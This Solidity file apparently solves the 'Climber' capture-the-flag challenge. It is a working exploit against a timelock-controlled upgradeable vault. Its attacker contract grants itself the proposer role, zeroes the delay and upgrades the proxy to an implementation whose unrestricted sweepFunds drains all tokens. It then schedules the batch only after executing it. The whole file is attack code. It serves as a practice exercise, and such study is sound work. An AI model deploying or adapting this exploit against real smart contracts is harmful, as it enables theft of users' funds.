// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";
import "hardhat/console.sol";

contract ClimberVaultUpgraded is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    // uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    // uint256 public constant WAITING_PERIOD = 15 days;

    // uint256 private _lastWithdrawalTimestamp;
    // address private _sweeper;

    // modifier onlySweeper() {
    //     require(msg.sender == _sweeper, "Caller must be sweeper");
    //     _;
    // }

    // /// @custom:oz-upgrades-unsafe-allow constructor
    // constructor() initializer {}

    // function initialize(address admin, address proposer, address sweeper) initializer external {
    //     // Initialize inheritance chain
    //     __Ownable_init();
    //     __UUPSUpgradeable_init();

    //     // Deploy timelock and transfer ownership to it
    //     transferOwnership(address(new ClimberTimelock(admin, proposer)));

    //     // _setSweeper(sweeper);
    //     // _setLastWithdrawal(block.timestamp);
    //     _lastWithdrawalTimestamp = block.timestamp;
    // }

    // // Allows the owner to send a limited amount of tokens to a recipient every now and then
    // function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner {
    //     require(amount <= WITHDRAWAL_LIMIT, "Withdrawing too much");
    //     require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, "Try later");
        
    //     _setLastWithdrawal(block.timestamp);

    //     IERC20 token = IERC20(tokenAddress);
    //     require(token.transfer(recipient, amount), "Transfer failed");
    // }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress, address recipient) public {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
    }

    // function getSweeper() external view returns (address) {
    //     return _sweeper;
    // }

    // function _setSweeper(address newSweeper) internal {
    //     _sweeper = newSweeper;
    // }

    // function getLastWithdrawalTimestamp() external view returns (uint256) {
    //     return _lastWithdrawalTimestamp;
    // }

    // function _setLastWithdrawal(uint256 timestamp) internal {
    //     _lastWithdrawalTimestamp = timestamp;
    // }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}

contract ClimberVaultAttacker {

    // three arrays that will be used in ClimberTimeLock.schedule() 
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    ClimberTimelock timeLock;
    ClimberVaultUpgraded upgradedClimber;

     function _push(address targetAddr, bytes memory data) internal {
        targets.push(targetAddr);
        values.push(0);
        dataElements.push(data);
    }

    function attack(address payable _timelock, address _proxy, address tokenAddr, address recipient) external {

        upgradedClimber = new ClimberVaultUpgraded();

        // change the proser_role of the climbertimelock contract
        timeLock = ClimberTimelock(_timelock);
        _push(
            address(timeLock),
            abi.encodeWithSelector(
                AccessControl.grantRole.selector,
                timeLock.PROPOSER_ROLE(),
                address(this) 
            )
        );

        // change delay time
        _push(
            address(timeLock),
            abi.encodeWithSelector(
                ClimberTimelock.updateDelay.selector,
                uint64(0) 
            )
        );
        // upgrade logic contract from proxy
        _push(
            _proxy,
            abi.encodeWithSelector(
                UUPSUpgradeable.upgradeToAndCall.selector,
                address(upgradedClimber),
                abi.encodeWithSelector( 
                    upgradedClimber.sweepFunds.selector,
                    tokenAddr,
                    recipient
                )
            )
        );

        // schedule all the sequential calls 
        _push(
            address(this),
            abi.encodeWithSelector(
                ClimberVaultAttacker.scheduler.selector
            )
        );

        // execute all the sequential calls
        timeLock.execute(
            targets,
            values,
            dataElements,
            bytes32(0)
        );

    }

    // need to add this function for schedule since ClimberTimelock.schedule() is external
    function scheduler() external {
        timeLock.schedule(targets, values, dataElements, bytes32(0));
    }

}
